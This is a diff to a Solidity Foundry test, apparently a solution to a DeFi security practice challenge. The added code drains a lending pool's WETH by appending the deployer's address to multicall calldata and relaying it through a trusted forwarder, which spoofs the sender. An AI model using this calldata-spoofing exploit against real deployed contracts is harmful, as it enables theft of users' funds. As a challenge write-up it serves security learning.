@@ -257,62 +257,77 @@ console.log("recovery weth:", postRecovery);
     }
 
 function _lessIteration() public {
-// --- build a single withdraw call and append deployer as last 20 bytes ---
-bytes[] memory calls = new bytes[](1);
+// --- BEFORE: print balances ---
+    console.log("=== BEFORE exploit ===");
+    console.log("player weth:", weth.balanceOf(player));
+    console.log("receiver weth:", weth.balanceOf(address(receiver)));
+    console.log("pool weth:", weth.balanceOf(address(pool)));
+    console.log("recovery weth:", weth.balanceOf(recovery));
+    console.log("");
 
+    // --- Build single withdraw call and append deployer as last 20 bytes ---
+    bytes[] memory calls = new bytes[](1);
+    // amount to withdraw: use entire pool WETH balance (deployer deposited initial funds)
+    uint256 depositAmount = weth.balanceOf(address(pool));
 
-// amount to withdraw: use pool WETH balance (deployer deposited pool initial funds)
-uint256 depositAmount = weth.balanceOf(address(pool));
+    // Create withdraw calldata and append exact 20-byte deployer address so the pool sees it as the tail
+    calls[0] = abi.encodePacked(
+        abi.encodeCall(NaiveReceiverPool.withdraw, (depositAmount, payable(recovery))),
+        bytes20(deployer) // append exactly 20 bytes (no padding) -> becomes last 20 bytes of calldata
+    );
 
-// append exact 20 bytes (address) — this ensures calldata ends with those 20 bytes
-calls[0] = abi.encodePacked(
-    abi.encodeCall(NaiveReceiverPool.withdraw, (depositAmount, payable(recovery))),
-    bytes20(deployer) // <<< append exactly 20 bytes (no 12-byte padding)
-);
+    // Encode the multicall calldata for pool.multicall(calls)
+    bytes memory callData = abi.encodeCall(pool.multicall, (calls));
 
-// encode multicall calldata
-bytes memory callData = abi.encodeCall(pool.multicall, (calls));
+    // --- DEBUG: read and print the last 32 bytes of callData ---
+    bytes32 last32;
+    uint256 len = callData.length;
+    assembly {
+        // load the final 32-byte word of the calldata buffer
+        last32 := mload(add(add(callData, 32), sub(len, 32)))
+    }
+    console.log("last 32 bytes (hex):");
+    console.logBytes32(last32);
 
-// DEBUG: show last 32 bytes of callData
-bytes32 lastWord;
-uint256 len = callData.length;
-assembly { lastWord := mload(add(add(callData, 32), sub(len, 32))) }
-console.log("last 32 bytes (hex):"); console.logBytes32(lastWord);
+    // --- CORRECT extraction: convert high-order 20 bytes of last32 into an address ---
+    // the appended bytes20(deployer) occupy the most-significant 20 bytes of last32
+    address last20Address = address(uint160(uint256(last32) >> 96)); // shift right 12 bytes (96 bits)
+    console.log("last20 (as address):");
+    console.logAddress(last20Address);
+    console.log("expected deployer:");
+    console.logAddress(deployer);
 
-// CORRECT extraction of the last 20 bytes as an address:
-// - load 32 bytes starting at the beginning of the last-20 slice
-// - the 20 bytes occupy the *most significant* 20 bytes of that loaded word,
-//   so we shift right by 12 bytes (96 bits) to move them to low-order position.
-bytes20 last20;
-assembly {
-    let start := add(callData, add(32, sub(len, 20))) // pointer to first byte of last 20 bytes
-    last20 := shr(96, mload(start)) // shift right by 12 bytes (96 bits)
-}
-console.log("last20 (as address):"); console.logAddress(address(last20));
-console.log("expected deployer:", deployer);
+    // --- Build EIP-712 forwarder request and sign it ---
+    BasicForwarder.Request memory request = BasicForwarder.Request(
+        player,
+        address(pool),
+        0,
+        gasleft(),
+        forwarder.nonces(player),
+        callData,
+        1 days
+    );
 
-// ... build forwarder request, sign and execute as before
-BasicForwarder.Request memory request = BasicForwarder.Request(
-    player,
-    address(pool),
-    0,
-    gasleft(),
-    forwarder.nonces(player),
-    callData,
-    1 days
-);
+    bytes32 requestHash = keccak256(
+        abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request))
+    );
+    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
+    bytes memory signature = abi.encodePacked(r, s, v);
 
-bytes32 requestHash = keccak256(
-    abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request))
-);
-(uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
-bytes memory signature = abi.encodePacked(r, s, v);
+    // --- Execute via trusted forwarder (this is the exploit step) ---
+    forwarder.execute(request, signature);
 
-forwarder.execute(request, signature);
+    // --- AFTER: print balances to verify drain ---
+    console.log("");
+    console.log("=== AFTER exploit ===");
+    console.log("player weth:", weth.balanceOf(player));
+    console.log("receiver weth:", weth.balanceOf(address(receiver)));
+    console.log("pool weth:", weth.balanceOf(address(pool)));
+    console.log("recovery weth:", weth.balanceOf(recovery));
 
-console.log("after forwarder execute: pool:", weth.balanceOf(address(pool)), "recovery:", weth.balanceOf(recovery));
-
-
+    // Optional sanity asserts (uncomment if you want strict test failure on mismatch)
+    // assertEq(weth.balanceOf(address(pool)), 0, "Pool not drained");
+    // assertEq(weth.balanceOf(recovery), depositAmount, "Recovery did not receive funds");
 }
 
 function test_lessIteration() public {
